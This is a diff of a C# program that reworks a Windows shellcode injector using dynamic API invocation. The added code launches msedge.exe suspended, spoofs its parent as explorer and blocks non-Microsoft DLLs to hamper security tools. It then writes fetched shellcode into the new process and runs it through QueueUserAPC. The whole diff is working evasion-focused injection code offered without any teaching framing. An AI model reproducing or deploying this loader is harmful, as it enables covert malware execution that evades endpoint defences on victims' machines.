@@ -1,16 +1,17 @@
 using System;
-using System.Diagnostics;
-using System.IO;
-using System.Net;
+using System.ComponentModel;
 using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.Net;
+using DInvoke.DynamicInvoke;
+using System.IO;
 
-namespace DInvokeOrdinalsQueueUserApc
+namespace ConsoleApplication16
 {
-    public class Program
+    internal static class Program
     {
-        static void Main(string[] args)
+        public static void Main()
         {
-
             // Fetch shellcode
             byte[] shellcode;
 
@@ -27,274 +28,182 @@ namespace DInvokeOrdinalsQueueUserApc
             // Image for process to start and inject into
             string processPath = @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe";
 
-            //Instead of STARTUPINFO struct we are going to use STARTUOINFOEX struct. This is used
-            //to specify the attributes we are going to use with CreateProcess.
-            // Initialize the STARTUOINFOEX and PROCESS_INFORMATION structs:
-            var si = new STRUCTS.STARTUPINFOEX();
+            // get attribute size
+            var lpSize = IntPtr.Zero;
+            _ = InitializeProcThreadAttributeList(IntPtr.Zero, ref lpSize);
+
+            // create si info
+            var si = new Win32.STARTUPINFOEX();
             si.StartupInfo.cb = (uint)Marshal.SizeOf(si);
             si.StartupInfo.dwFlags = 0x00000001;
+            si.lpAttributeList = Marshal.AllocHGlobal(lpSize);
 
-            STRUCTS.PROCESS_INFORMATION pi = new STRUCTS.PROCESS_INFORMATION();
+            // initialise again
+            var success = InitializeProcThreadAttributeList(si.lpAttributeList, ref lpSize);
 
-            var lpValue = Marshal.AllocHGlobal(IntPtr.Size);
+            if (!success)
+                throw new Win32Exception(Marshal.GetLastWin32Error());
 
-            try
-            {
-                // The APIs that allow us PPID spoofing and BlockDLLs are InitializeProcThreadAttributeList and UpdateProcThreadAttribute.
-                // InitializeProcThreadAttributeList allows us to initialize the attributes we need
-                // and then we can update or push them using UpdateProcThreadAttribute. 
+            // block dlls
+            var mitigationValue = Marshal.AllocHGlobal(IntPtr.Size);
+            Marshal.WriteIntPtr(
+                mitigationValue,
+                new IntPtr((long)Win32.BinarySignaturePolicy.BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));
 
+            // update list
+            success = UpdateProcThreadAttribute(
+                si.lpAttributeList,
+                Win32.PROC_THREAD_ATTRIBUTE.MITIGATION_POLICY,
+                mitigationValue);
 
-                // First call to InitializeProcThreadAttributeList:
-                // Use InitializeProcThreadAttributeList to initialize the specified list of attributes for
-                // process and thread creation. We need to specify dwAttributeCount as "2". One for PPID and the other to specify mitigation policy.
-                IntPtr pointer = TinySharpSploit.GetLibraryAddress("kernel32.dll", "InitializeProcThreadAttributeList");
-                DELEGATES.InitializeProcThreadAttributeList initializeProcThreadAttributeList = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.InitializeProcThreadAttributeList)) as DELEGATES.InitializeProcThreadAttributeList;
+            if (!success)
+                throw new Win32Exception(Marshal.GetLastWin32Error());
 
-                IntPtr lpSize = IntPtr.Zero;
-                initializeProcThreadAttributeList(IntPtr.Zero,
-                                                  2,
-                                                  0,
-                                                  ref lpSize);
+            // ppid spoof
+            var parent = Process.GetProcessesByName("explorer")[0];
+            var ppidValue = Marshal.AllocHGlobal(IntPtr.Size);
+            Marshal.WriteIntPtr(ppidValue, parent.Handle);
 
-                // Second call to InitializeProcThreadAttributeList:
-                // We also need lpAttributeList. We determine the buffer size using Marshal.AllocHGlobal and provide
-                // it IntPtr.Size which is 8 for x64 processes. We are going to provide this value to the STARTUPINFOEX.lpAttributeList
-                // struct and then call InitializeProcThreadAttributeList again.
-                si.lpAttributeList = Marshal.AllocHGlobal(lpSize);
-                initializeProcThreadAttributeList(si.lpAttributeList,
-                                                  2,
-                                                  0,
-                                                  ref lpSize);
-                
-                
-                //                 //
-                //  Block DLLs     //
-                //                 // 
-                
-                // Check bitness
-                if (Is64Bit)
-                {
-                    Marshal.WriteIntPtr(lpValue, new IntPtr((long)STRUCTS.BinarySignaturePolicy.BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));
-                }
-                else
-                {
-                    Marshal.WriteIntPtr(lpValue, new IntPtr(unchecked((uint)STRUCTS.BinarySignaturePolicy.BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON)));
-                }
+            // update list
+            success = UpdateProcThreadAttribute(
+                si.lpAttributeList,
+                Win32.PROC_THREAD_ATTRIBUTE.PARENT_PROCESS,
+                ppidValue);
 
-                // First call to UpdateProcThreadAttribute API (BlockDLLs)
-                pointer = TinySharpSploit.GetLibraryAddress("kernel32.dll", "UpdateProcThreadAttribute");
-                DELEGATES.UpdateProcThreadAttribute updateProcThreadAttribute = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.UpdateProcThreadAttribute)) as DELEGATES.UpdateProcThreadAttribute;
-                updateProcThreadAttribute(si.lpAttributeList,
-                                          0,
-                                          (IntPtr)STRUCTS.ProcThreadAttribute.MITIGATION_POLICY,
-                                          lpValue,
-                                          (IntPtr)IntPtr.Size,
+            if (!success)
+                throw new Win32Exception(Marshal.GetLastWin32Error());
+
+            // create process
+            success = CreateProcess(
+                processPath,
+                si,
+                out var pi);
+
+            if (!success)
+                throw new Win32Exception(Marshal.GetLastWin32Error());
+
+            Console.WriteLine($"hProcess : 0x{pi.hProcess}");
+            Console.WriteLine($"hThread  : 0x{pi.hThread}");
+
+            IntPtr pointer = TinySharpSploit.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
+            Delegates.VirtualAllocEx virtualAllocEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(Delegates.VirtualAllocEx)) as Delegates.VirtualAllocEx;
+            IntPtr alloc = virtualAllocEx(pi.hProcess,
                                           IntPtr.Zero,
-                                          IntPtr.Zero);
+                                          (uint)shellcode.Length,
+                                          0x1000 | 0x2000,
+                                          0x40);
 
-                //                 //
-                //  PPID Spoofing  //
-                //                 //
-                // Get handle to process we want to use for PPID spoofing
-                var hParent = Process.GetProcessesByName("explorer")[0].Handle;
-                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
-                Marshal.WriteIntPtr(lpValue, hParent);
-                // For debugging only:
-                var pidParent = Process.GetProcessesByName("explorer")[0].Id;
-                Console.WriteLine("[*] New Parent PID Found: {0}", pidParent);
+            pointer = TinySharpSploit.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
+            Delegates.WriteProcessMemory writeProcessMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(Delegates.WriteProcessMemory)) as Delegates.WriteProcessMemory;
+            writeProcessMemory(pi.hProcess,
+                               alloc,
+                               shellcode,
+                               (uint)shellcode.Length,
+                               out UIntPtr bytesWritten);
 
-                // Second call to UpdateProcThreadAttribute API (PPID Spoof)
-                updateProcThreadAttribute(si.lpAttributeList,
-                                          0,
-                                          (IntPtr)STRUCTS.ProcThreadAttribute.PARENT_PROCESS,
-                                          lpValue,
-                                          (IntPtr)IntPtr.Size,
-                                          IntPtr.Zero,
-                                          IntPtr.Zero);
+            pointer = TinySharpSploit.GetLibraryAddress("kernel32.dll", "OpenThread");
+            Delegates.OpenThread openThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(Delegates.OpenThread)) as Delegates.OpenThread;
+            IntPtr tpointer = openThread(Win32.ThreadAccess.SET_CONTEXT,
+                                         false,
+                                         (int)pi.dwThreadId);
+            uint oldProtect = 0;
 
-                var pa = new STRUCTS.SECURITY_ATTRIBUTES();
-                var ta = new STRUCTS.SECURITY_ATTRIBUTES();
-                pa.nLength = Marshal.SizeOf(pa);
-                ta.nLength = Marshal.SizeOf(ta);
+            pointer = TinySharpSploit.GetLibraryAddress("kernel32.dll", "VirtualProtectEx");
+            Delegates.VirtualProtectEx virtualProtectEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(Delegates.VirtualProtectEx)) as Delegates.VirtualProtectEx;
+            virtualProtectEx(pi.hProcess,
+                             alloc,
+                             shellcode.Length,
+                             0x20,
+                             out oldProtect);
 
-                pointer = TinySharpSploit.GetLibraryAddress("kernel32.dll", "CreateProcessA");
-                DELEGATES.CreateProcess CreateProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.CreateProcess)) as DELEGATES.CreateProcess;
-                bool success = CreateProcess(processPath,
-                                             null,
-                                             IntPtr.Zero,
-                                             IntPtr.Zero,
-                                             false,
-                                             STRUCTS.ProcessCreationFlags.EXTENDED_STARTUPINFO_PRESENT,
-                                             IntPtr.Zero,
-                                             null,
-                                             ref si,
-                                             out pi);
+            pointer = TinySharpSploit.GetLibraryAddress("kernel32.dll", "QueueUserAPC");
+            Delegates.QueueUserAPC queueUserAPC = Marshal.GetDelegateForFunctionPointer(pointer, typeof(Delegates.QueueUserAPC)) as Delegates.QueueUserAPC;
+            queueUserAPC(alloc,
+                         tpointer,
+                         IntPtr.Zero);
 
-                pointer = TinySharpSploit.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
-                DELEGATES.VirtualAllocEx virtualAllocEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.VirtualAllocEx)) as DELEGATES.VirtualAllocEx;
-                IntPtr alloc = virtualAllocEx(pi.hProcess,
-                                              IntPtr.Zero,
-                                              (uint)shellcode.Length,
-                                              0x1000 | 0x2000,
-                                              0x40);
+            pointer = TinySharpSploit.GetLibraryAddress("kernel32.dll", "ResumeThread");
+            Delegates.ResumeThread resumeThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(Delegates.ResumeThread)) as Delegates.ResumeThread;
+            resumeThread(pi.hThread);
 
-                pointer = TinySharpSploit.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
-                DELEGATES.WriteProcessMemory writeProcessMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.WriteProcessMemory)) as DELEGATES.WriteProcessMemory;
-                writeProcessMemory(pi.hProcess,
-                                   alloc,
-                                   shellcode,
-                                   (uint)shellcode.Length,
-                                   out UIntPtr bytesWritten);
 
-                pointer = TinySharpSploit.GetLibraryAddress("kernel32.dll", "OpenThread");
-                DELEGATES.OpenThread openThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.OpenThread)) as DELEGATES.OpenThread;
-                IntPtr tpointer = openThread(STRUCTS.ThreadAccess.SET_CONTEXT,
-                                             false,
-                                             (int)pi.dwThreadId);
-                uint oldProtect = 0;
+            // clean up
+            DeleteProcThreadAttributeList(si.lpAttributeList);
 
-                pointer = TinySharpSploit.GetLibraryAddress("kernel32.dll", "VirtualProtectEx");
-                DELEGATES.VirtualProtectEx virtualProtectEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.VirtualProtectEx)) as DELEGATES.VirtualProtectEx;
-                virtualProtectEx(pi.hProcess,
-                                 alloc,
-                                 shellcode.Length,
-                                 0x20,
-                                 out oldProtect);
-
-                pointer = TinySharpSploit.GetLibraryAddress("kernel32.dll", "QueueUserAPC");
-                DELEGATES.QueueUserAPC queueUserAPC = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.QueueUserAPC)) as DELEGATES.QueueUserAPC;
-                queueUserAPC(alloc,
-                             tpointer,
-                             IntPtr.Zero);
-
-                pointer = TinySharpSploit.GetLibraryAddress("kernel32.dll", "ResumeThread");
-                DELEGATES.ResumeThread resumeThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.ResumeThread)) as DELEGATES.ResumeThread;
-                resumeThread(pi.hThread);
-
-            }
-            
-
-            catch(Exception e)
-            {
-                Console.Error.WriteLine(e.Message);
-            }
-            
-
-            finally
-            {
-                // Clean up
-                var funcParams = new object[]
-                {
-                    si.lpAttributeList
-                };
-
-                IntPtr pointer = TinySharpSploit.GetLibraryAddress("kernel32.dll", "DeleteProcThreadAttributeList");
-                DELEGATES.DeleteProcThreadAttributeList deleteProcThreadAttributeList = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.DeleteProcThreadAttributeList)) as DELEGATES.DeleteProcThreadAttributeList;
-                deleteProcThreadAttributeList(pi.hThread);
-
-                Marshal.FreeHGlobal(si.lpAttributeList);
-                Marshal.FreeHGlobal(lpValue);
-            }
-
+            Marshal.FreeHGlobal(si.lpAttributeList);
+            Marshal.FreeHGlobal(mitigationValue);
+            Marshal.FreeHGlobal(ppidValue);
         }
 
-        static bool Is64Bit
+        private static bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, ref IntPtr lpSize)
         {
-            get
-            {
-                return IntPtr.Size == 8;
-            }
+            object[] parameters = { lpAttributeList, 2, 0, lpSize };
+
+            var result = (bool)Generic.DynamicAPIInvoke(
+                "kernel32.dll",
+                "InitializeProcThreadAttributeList",
+                typeof(Delegates.InitializeProcThreadAttributeList),
+                ref parameters);
+
+            lpSize = (IntPtr)parameters[3];
+            return result;
         }
 
-        public Program()
+        private static bool UpdateProcThreadAttribute(IntPtr lpAttributeList, Win32.PROC_THREAD_ATTRIBUTE attribute, IntPtr lpValue)
         {
-            Main(new string[] { });
+            object[] parameters =
+            {
+                lpAttributeList, (uint)0, (IntPtr)attribute, lpValue,
+                (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero
+            };
 
+            return (bool)Generic.DynamicAPIInvoke(
+                "kernel32.dll",
+                "UpdateProcThreadAttribute",
+                typeof(Delegates.UpdateProcThreadAttribute),
+                ref parameters);
         }
 
+        private static bool CreateProcess(string processPath, Win32.STARTUPINFOEX startupInfo, out Win32.PROCESS_INFORMATION processInfo)
+        {
+            var pa = new Win32.SECURITY_ATTRIBUTES();
+            var ta = new Win32.SECURITY_ATTRIBUTES();
+            pa.nLength = Marshal.SizeOf(pa);
+            ta.nLength = Marshal.SizeOf(ta);
 
+            object[] parameters =
+            {
+                null, processPath, pa, ta, false,
+                Win32.PROCESS_CREATION_FLAGS.EXTENDED_STARTUPINFO_PRESENT | Win32.PROCESS_CREATION_FLAGS.CREATE_SUSPENDED,
+                IntPtr.Zero, "C:\\Windows\\System32", startupInfo, null
+            };
+
+            var result = (bool)Generic.DynamicAPIInvoke(
+                "kernel32.dll",
+                "CreateProcessA",
+                typeof(Delegates.CreateProcess),
+                ref parameters,
+                true);
+
+            processInfo = (Win32.PROCESS_INFORMATION)parameters[9];
+            return result;
+        }
+
+        private static void DeleteProcThreadAttributeList(IntPtr lpAttributeList)
+        {
+            object[] parameters = { lpAttributeList };
+
+            Generic.DynamicAPIInvoke(
+                "kernel32.dll",
+                "DeleteProcThreadAttributeList",
+                typeof(Delegates.DeleteProcThreadAttributeList),
+                ref parameters,
+                true);
+        }
     }
 
-
-    public class DELEGATES
+    internal static class Delegates
     {
-        // Instead of using DllImport in P/Invoke, D/Invoke relies on delegates decorated with the UnmanagedFunctionPointer attribute. 
-
-        // Use OpenProcess to get a process handle for the parent process we are specifying. 
-        // API not used in RM's code. Seems like GetProcessesByName can give us all needed information. Commenting out for the time beeing
-        // [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        // public delegate IntPtr OpenProcess(
-        // STRUCTS.ProcessAccessFlags processAccess, 
-        // bool bInheritHandle, 
-        // int processId);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate Boolean CreateProcess(
-            string lpApplicationName, 
-            string lpCommandLine, 
-            IntPtr lpProcessAttributes, 
-            IntPtr lpThreadAttributes, 
-            bool bInheritHandles, 
-            STRUCTS.ProcessCreationFlags dwCreationFlags, 
-            IntPtr lpEnvironment, 
-            string lpCurrentDirectory, 
-            ref STRUCTS.STARTUPINFOEX lpStartupInfo, 
-            out STRUCTS.PROCESS_INFORMATION lpProcessInformation);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate IntPtr VirtualAllocEx(
-            IntPtr hProcess, 
-            IntPtr lpAddress, 
-            uint dwSize, 
-            uint flAllocationType, 
-            uint flProtect);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate bool WriteProcessMemory(
-            IntPtr hProcess, 
-            IntPtr lpBaseAddress, 
-            byte[] lpBuffer, 
-            uint nSize, 
-            out UIntPtr lpNumberOfBytesWritten);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate IntPtr OpenThread(
-            STRUCTS.ThreadAccess dwDesiredAccess, 
-            bool bInheritHandle,
-            int dwThreadId);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate Boolean VirtualProtectEx(
-            IntPtr hProcess, 
-            IntPtr lpAddress, 
-            int dwSize, 
-            uint flNewProtect, 
-            out uint lpflOldProtect);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate IntPtr QueueUserAPC(
-            IntPtr pfnAPC, 
-            IntPtr hThread, 
-            IntPtr dwData);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate uint ResumeThread(
-            IntPtr hThhread);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate UInt32 LdrLoadDll
-            (IntPtr PathToFile, 
-            UInt32 dwFlags, 
-            ref STRUCTS.UNICODE_STRING ModuleFileName, 
-            ref IntPtr ModuleHandle);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate void RtlInitUnicodeString(
-            ref STRUCTS.UNICODE_STRING DestinationString, 
-            [MarshalAs(UnmanagedType.LPWStr)] string SourceString);
-
-        // The APIs that allow us PPID spoofing and BlockDLLs are InitializeProcThreadAttributeList and UpdateProcThreadAttribute
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         public delegate bool InitializeProcThreadAttributeList(
             IntPtr lpAttributeList,
@@ -306,60 +215,147 @@ namespace DInvokeOrdinalsQueueUserApc
         public delegate bool UpdateProcThreadAttribute(
             IntPtr lpAttributeList,
             uint dwFlags,
-            IntPtr Attribute,
+            IntPtr attribute,
             IntPtr lpValue,
             IntPtr cbSize,
             IntPtr lpPreviousValue,
             IntPtr lpReturnSize);
 
-        // DeleteProcThreadAttributeList is used to clean up the ProcThreadAttributeList after we have created the process
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate bool DeleteProcThreadAttributeList(
-            IntPtr lpAttributeList);
-    }
-    
-    
-    public class STRUCTS
-    {
+        public delegate bool CreateProcess(
+            string lpApplicationName,
+            string lpCommandLine,
+            ref Win32.SECURITY_ATTRIBUTES lpProcessAttributes,
+            ref Win32.SECURITY_ATTRIBUTES lpThreadAttributes,
+            bool bInheritHandles,
+            Win32.PROCESS_CREATION_FLAGS dwCreationFlags,
+            IntPtr lpEnvironment,
+            string lpCurrentDirectory,
+            ref Win32.STARTUPINFOEX lpStartupInfo,
+            out Win32.PROCESS_INFORMATION lpProcessInformation);
 
-        [Flags]
-        public enum ProcessCreationFlags : uint
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr VirtualAllocEx(
+            IntPtr hProcess,
+            IntPtr lpAddress,
+            uint dwSize,
+            uint flAllocationType,
+            uint flProtect);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate bool WriteProcessMemory(
+            IntPtr hProcess,
+            IntPtr lpBaseAddress,
+            byte[] lpBuffer,
+            uint nSize,
+            out UIntPtr lpNumberOfBytesWritten);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr OpenThread(
+            Win32.ThreadAccess dwDesiredAccess,
+            bool bInheritHandle,
+            int dwThreadId);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate Boolean VirtualProtectEx(
+            IntPtr hProcess,
+            IntPtr lpAddress,
+            int dwSize,
+            uint flNewProtect,
+            out uint lpflOldProtect);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr QueueUserAPC(
+            IntPtr pfnAPC,
+            IntPtr hThread,
+            IntPtr dwData);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate uint ResumeThread(
+            IntPtr hThhread);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate UInt32 LdrLoadDll
+            (IntPtr PathToFile,
+            UInt32 dwFlags,
+            ref Win32.UNICODE_STRING ModuleFileName,
+            ref IntPtr ModuleHandle);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate void RtlInitUnicodeString(
+            ref Win32.UNICODE_STRING DestinationString,
+            [MarshalAs(UnmanagedType.LPWStr)] string SourceString);
+    }
+
+    internal static class Win32
+    {
+        [StructLayout(LayoutKind.Sequential)]
+        public struct UNICODE_STRING
         {
-            ZERO_FLAG = 0x00000000,
-            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
-            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
-            CREATE_NEW_CONSOLE = 0x00000010,
-            CREATE_NEW_PROCESS_GROUP = 0x00000200,
-            CREATE_NO_WINDOW = 0x08000000,
-            CREATE_PROTECTED_PROCESS = 0x00040000,
-            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
-            CREATE_SEPARATE_WOW_VDM = 0x00001000,
-            CREATE_SHARED_WOW_VDM = 0x00001000,
-            CREATE_SUSPENDED = 0x00000004,
-            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
-            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
-            DEBUG_PROCESS = 0x00000001,
-            DETACHED_PROCESS = 0x00000008,
-            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
-            INHERIT_PARENT_AFFINITY = 0x00010000
+            public UInt16 Length;
+            public UInt16 MaximumLength;
+            public IntPtr Buffer;
         }
 
-        [Flags]
-        public enum ProcessAccessFlags : uint
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_INFORMATION
         {
-            All = 0x001F0FFF,
-            Terminate = 0x00000001,
-            CreateThread = 0x00000002,
-            VirtualMemoryOperation = 0x00000008,
-            VirtualMemoryRead = 0x00000010,
-            VirtualMemoryWrite = 0x00000020,
-            DuplicateHandle = 0x00000040,
-            CreateProcess = 0x000000080,
-            SetQuota = 0x00000100,
-            SetInformation = 0x00000200,
-            QueryInformation = 0x00000400,
-            QueryLimitedInformation = 0x00001000,
-            Synchronize = 0x00100000
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct STARTUPINFO
+        {
+            public uint cb;
+            public IntPtr lpReserved;
+            public IntPtr lpDesktop;
+            public IntPtr lpTitle;
+            public uint dwX;
+            public uint dwY;
+            public uint dwXSize;
+            public uint dwYSize;
+            public uint dwXCountChars;
+            public uint dwYCountChars;
+            public uint dwFillAttributes;
+            public uint dwFlags;
+            public ushort wShowWindow;
+            public ushort cbReserved;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdErr;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct STARTUPINFOEX
+        {
+            public STARTUPINFO StartupInfo;
+            public IntPtr lpAttributeList;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SECURITY_ATTRIBUTES
+        {
+            public int nLength;
+            public IntPtr lpSecurityDescriptor;
+            public int bInheritHandle;
+        }
+
+        public enum PROC_THREAD_ATTRIBUTE
+        {
+            MITIGATION_POLICY = 0x20007,
+            PARENT_PROCESS = 0x00020000
+        }
+
+        public enum BinarySignaturePolicy : ulong
+        {
+            BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000,
         }
 
         [Flags]
@@ -379,68 +375,25 @@ namespace DInvokeOrdinalsQueueUserApc
         }
 
         [Flags]
-        public enum ProcThreadAttribute : int
+        public enum PROCESS_CREATION_FLAGS : uint
         {
-            MITIGATION_POLICY = 0x20007,
-            PARENT_PROCESS = 0x00020000
-        }
-
-        [Flags]
-        public enum BinarySignaturePolicy : ulong
-        {
-            BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000,
-        }
-
-        public struct PROCESS_INFORMATION
-        {
-            public IntPtr hProcess;
-            public IntPtr hThread;
-            public uint dwProcessId;
-            public uint dwThreadId;
-        }
-        public struct STARTUPINFO
-        {
-            public uint cb;
-            public string lpReserved;
-            public string lpDesktop;
-            public string lpTitle;
-            public uint dwX;
-            public uint dwY;
-            public uint dwXSize;
-            public uint dwYSize;
-            public uint dwXCountChars;
-            public uint dwYCountChars;
-            public uint dwFillAttribute;
-            public uint dwFlags;
-            public short wShowWindow;
-            public short cbReserved2;
-            public IntPtr lpReserved2;
-            public IntPtr hStdInput;
-            public IntPtr hStdOutput;
-            public IntPtr hStdError;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct STARTUPINFOEX
-        {
-            public STARTUPINFO StartupInfo;
-            public IntPtr lpAttributeList;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct SECURITY_ATTRIBUTES
-        {
-            public int nLength;
-            public IntPtr lpSecurityDescriptor;
-            public int bInheritHandle;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct UNICODE_STRING
-        {
-            public UInt16 Length;
-            public UInt16 MaximumLength;
-            public IntPtr Buffer;
+            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
+            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
+            CREATE_NEW_CONSOLE = 0x00000010,
+            CREATE_NEW_PROCESS_GROUP = 0x00000200,
+            CREATE_NO_WINDOW = 0x08000000,
+            CREATE_PROTECTED_PROCESS = 0x00040000,
+            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
+            CREATE_SECURE_PROCESS = 0x00400000,
+            CREATE_SEPARATE_WOW_VDM = 0x00000800,
+            CREATE_SHARED_WOW_VDM = 0x00001000,
+            CREATE_SUSPENDED = 0x00000004,
+            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
+            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
+            DEBUG_PROCESS = 0x00000001,
+            DETACHED_PROCESS = 0x00000008,
+            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
+            INHERIT_PARENT_AFFINITY = 0x00010000
         }
 
         /// <summary>
@@ -792,40 +745,10 @@ namespace DInvokeOrdinalsQueueUserApc
 
             MaximumNtStatus = 0xffffffff
         }
-
     }
-    public class TinySharpSploit
+
+    public class TinySharpSploit : TinySharpSploitBase
     {
-
-        public static STRUCTS.NTSTATUS LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref STRUCTS.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle)
-        {
-            // Craft an array for the arguments
-            object[] funcargs =
-            {
-                PathToFile, dwFlags, ModuleFileName, ModuleHandle
-            };
-
-            STRUCTS.NTSTATUS retValue = (STRUCTS.NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"LdrLoadDll", typeof(DELEGATES.RtlInitUnicodeString), ref funcargs);
-
-            // Update the modified variables
-            ModuleHandle = (IntPtr)funcargs[3];
-
-            return retValue;
-        }
-
-        public static void RtlInitUnicodeString(ref STRUCTS.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString)
-        {
-            // Craft an array for the arguments
-            object[] funcargs =
-            {
-                DestinationString, SourceString
-            };
-
-            DynamicAPIInvoke(@"ntdll.dll", @"RtlInitUnicodeString", typeof(DELEGATES.RtlInitUnicodeString), ref funcargs);
-
-            // Update the modified variables
-            DestinationString = (STRUCTS.UNICODE_STRING)funcargs[0];
-        }
 
         /// <summary>
         /// Dynamically invoke an arbitrary function from a DLL, providing its name, function prototype, and arguments.
@@ -865,12 +788,12 @@ namespace DInvokeOrdinalsQueueUserApc
         /// <returns>IntPtr base address of the loaded module or IntPtr.Zero if the module was not loaded successfully.</returns>
         public static IntPtr LoadModuleFromDisk(string DLLPath)
         {
-            STRUCTS.UNICODE_STRING uModuleName = new STRUCTS.UNICODE_STRING();
+            Win32.UNICODE_STRING uModuleName = new Win32.UNICODE_STRING();
             RtlInitUnicodeString(ref uModuleName, DLLPath);
 
             IntPtr hModule = IntPtr.Zero;
-            STRUCTS.NTSTATUS CallResult = LdrLoadDll(IntPtr.Zero, 0, ref uModuleName, ref hModule);
-            if (CallResult != STRUCTS.NTSTATUS.Success || hModule == IntPtr.Zero)
+            Win32.NTSTATUS CallResult = LdrLoadDll(IntPtr.Zero, 0, ref uModuleName, ref hModule);
+            if (CallResult != Win32.NTSTATUS.Success || hModule == IntPtr.Zero)
             {
                 return IntPtr.Zero;
             }
@@ -990,7 +913,4 @@ namespace DInvokeOrdinalsQueueUserApc
         }
 
     }
-
-
 }
-
